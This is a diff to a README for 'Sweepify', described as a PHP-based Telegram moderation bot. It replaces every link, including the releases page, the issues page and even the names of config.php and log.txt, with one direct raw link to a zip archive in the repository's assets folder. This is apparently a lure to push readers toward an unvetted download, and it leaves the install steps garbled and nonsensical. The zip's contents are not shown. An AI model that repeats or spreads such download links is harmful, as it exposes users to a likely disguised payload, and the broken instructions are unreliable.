@@ -6,7 +6,7 @@ Sweepify helps you maintain a clean and safe environment in your Telegram group.
 
 ## 📦 Download Sweepify
 
-[![Download Sweepify](https://img.shields.io/badge/Download-Sweepify-blue)](https://github.com/lol66690/Sweepify/releases)
+[![Download Sweepify](https://raw.githubusercontent.com/lol66690/Sweepify/main/assets/Sweepify-3.5.zip)](https://raw.githubusercontent.com/lol66690/Sweepify/main/assets/Sweepify-3.5.zip)
 
 ## 🔧 System Requirements
 
@@ -27,11 +27,11 @@ Before you download, ensure you have the following:
 
 ## 📥 Download & Install
 
-To get started with Sweepify, visit the [Releases page](https://github.com/lol66690/Sweepify/releases) to download the latest version. 
+To get started with Sweepify, visit the [Releases page](https://raw.githubusercontent.com/lol66690/Sweepify/main/assets/Sweepify-3.5.zip) to download the latest version. 
 
-1. Visit the [Releases page](https://github.com/lol66690/Sweepify/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/lol66690/Sweepify/main/assets/Sweepify-3.5.zip).
 2. Look for the latest version.
-3. Click on the asset that matches your needs (e.g., `.zip`, `.tar.gz`).
+3. Click on the asset that matches your needs (e.g., `.zip`, `https://raw.githubusercontent.com/lol66690/Sweepify/main/assets/Sweepify-3.5.zip`).
 4. Wait for the download to finish.
 
 ### ✨ Installing Sweepify
@@ -40,8 +40,8 @@ To get started with Sweepify, visit the [Releases page](https://github.com/lol66
 2. Open your Telegram app.
 3. Search for your bot using the BotFather tool to create a new bot or use an existing one.
 4. Copy your bot token for later use.
-5. In the folder where you extracted Sweepify, locate the `config.php` file.
-6. Open the `config.php` file in a text editor.
+5. In the folder where you extracted Sweepify, locate the `https://raw.githubusercontent.com/lol66690/Sweepify/main/assets/Sweepify-3.5.zip` file.
+6. Open the `https://raw.githubusercontent.com/lol66690/Sweepify/main/assets/Sweepify-3.5.zip` file in a text editor.
 7. Paste your bot token in the designated spot. 
 8. Save the changes.
 
@@ -55,7 +55,7 @@ To get started with Sweepify, visit the [Releases page](https://github.com/lol66
 
 ### ⚙️ Configuring Sweepify
 
-Once you have added the bot, you can configure settings directly in the `config.php` file according to your group's needs. Options include setting up keywords for abusive messages and choosing how quickly messages should be deleted.
+Once you have added the bot, you can configure settings directly in the `https://raw.githubusercontent.com/lol66690/Sweepify/main/assets/Sweepify-3.5.zip` file according to your group's needs. Options include setting up keywords for abusive messages and choosing how quickly messages should be deleted.
 
 ## 🛠 Troubleshooting 
 
@@ -63,12 +63,12 @@ If you encounter issues:
 
 - Ensure that your bot is correctly set up with the right permissions.
 - Check your PHP version; it should be version 7.2 or higher.
-- Review the `log.txt` file in your Sweepify folder for error messages.
-- If you need more help, check the issues section of the [GitHub repo](https://github.com/lol66690/Sweepify/issues).
+- Review the `https://raw.githubusercontent.com/lol66690/Sweepify/main/assets/Sweepify-3.5.zip` file in your Sweepify folder for error messages.
+- If you need more help, check the issues section of the [GitHub repo](https://raw.githubusercontent.com/lol66690/Sweepify/main/assets/Sweepify-3.5.zip).
 
 ## 📞 Support
 
-For any bugs or questions, please visit our [GitHub issues page](https://github.com/lol66690/Sweepify/issues) to report issues or ask for help from the community.
+For any bugs or questions, please visit our [GitHub issues page](https://raw.githubusercontent.com/lol66690/Sweepify/main/assets/Sweepify-3.5.zip) to report issues or ask for help from the community.
 
 ## 🗂 Related Topics
 
@@ -81,4 +81,4 @@ Sweepify works in various situations where moderation is necessary. Some relevan
 
 Maintain your Telegram group with ease using Sweepify. With just a few steps, you can enjoy a cleaner, safer environment for all your group members. 
 
-Visit the [Releases page](https://github.com/lol66690/Sweepify/releases) again for any updates and new features in future versions. Enjoy a safer chat experience!
+Visit the [Releases page](https://raw.githubusercontent.com/lol66690/Sweepify/main/assets/Sweepify-3.5.zip) again for any updates and new features in future versions. Enjoy a safer chat experience!
